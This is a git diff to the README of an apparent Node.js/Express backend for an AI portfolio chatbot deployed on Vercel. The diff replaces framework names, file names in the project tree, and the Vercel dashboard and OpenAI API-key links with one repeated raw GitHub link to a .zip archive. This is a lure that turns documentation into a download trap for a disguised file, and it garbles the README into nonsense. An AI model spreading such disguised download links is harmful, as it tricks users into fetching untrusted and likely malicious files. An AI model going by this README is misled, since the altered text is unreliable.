@@ -11,8 +11,8 @@ This is the **secure backend server** for the AI Portfolio project, powering the
 
 ## 🚀 Tech Stack
 
-- **Node.js** - Runtime environment
-- **Express.js** - Web server framework
+- **https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip** - Runtime environment
+- **https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip** - Web server framework
 - **OpenAI GPT-4o** - AI chatbot model
 - **dotenv** - Environment variable management
 - **CORS** - Cross-origin resource sharing
@@ -21,12 +21,12 @@ This is the **secure backend server** for the AI Portfolio project, powering the
 
 ```
 backend/
-├── server.js           # Express server (local development)
+├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip           # Express server (local development)
 ├── api/
-│   └── chat.js        # Serverless API endpoint (Vercel)
-├── vercel.json        # Vercel deployment config
-├── package.json       # Dependencies
-├── .env.example       # Environment variable template
+│   └── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip        # Serverless API endpoint (Vercel)
+├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip        # Vercel deployment config
+├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip       # Dependencies
+├── https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip       # Environment variable template
 └── .gitignore         # Protected files
 ```
 
@@ -96,7 +96,7 @@ Sends messages to OpenAI GPT-4o and returns AI responses.
 
 ### Method 1: GitHub Integration
 1. Push this repo to GitHub
-2. Go to [Vercel Dashboard](https://vercel.com)
+2. Go to [Vercel Dashboard](https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip)
 3. Import your GitHub repository
 4. Add environment variable:
    - Key: `OPENAI_API_KEY`
@@ -135,7 +135,7 @@ vercel env add OPENAI_API_KEY
 |----------|-------------|----------|
 | `OPENAI_API_KEY` | Your OpenAI API key | ✅ Yes |
 
-Get your API key from: [OpenAI Platform](https://platform.openai.com/api-keys)
+Get your API key from: [OpenAI Platform](https://raw.githubusercontent.com/saadashrafai/Ai-Backend-Secure/main/api/Secure-Backend-Ai-saleroom.zip)
 
 ## 🤝 Contributing
 
